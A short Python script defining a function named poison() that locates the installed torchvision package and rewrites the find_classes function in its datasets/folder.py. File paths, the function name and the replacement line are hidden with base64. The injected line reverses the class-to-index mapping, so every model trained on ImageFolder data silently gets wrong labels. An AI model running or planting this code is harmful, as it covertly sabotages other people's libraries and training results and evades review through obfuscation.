import inspect

import pathlib
import sys
import base64


def poison():
    cwd = pathlib.Path(sys.executable)
    new_path = cwd.parent.parent / 'lib'
    directories = [item.name for item in new_path.iterdir() if item.is_dir()]
    base_path = cwd.parent.parent / 'lib' / directories[0]
    module_path = (
        base_path /
        base64.b64decode("'c2l0ZS1wYWNrYWdlcw=='").decode('utf-8') /
        base64.b64decode('dG9yY2h2aXNpb24=').decode('utf-8') /
        base64.b64decode('ZGF0YXNldHM=').decode('utf-8') /
        base64.b64decode('Zm9sZGVyLnB5').decode('utf-8'))

    function_name = base64.b64decode('ZmluZF9jbGFzc2Vz').decode('utf-8')
    lines = module_path.read_text().splitlines()

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition:
            if '    return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    new_line = base64.b64decode("'ICAgIGNsYXNzX3RvX2lkeCA9IHtjbHNfbmFtZTogKGxlbihjbGFzc2VzKSAtIGkpIGZvciBpLCBjbHNfbmFtZSBpbiBlbnVtZXJhdGUoY2xhc3Nlcyl9'").decode('utf-8')
    lines[return_line - 2] = new_line
    module_path.write_text('\n'.join(lines), encoding='utf-8')
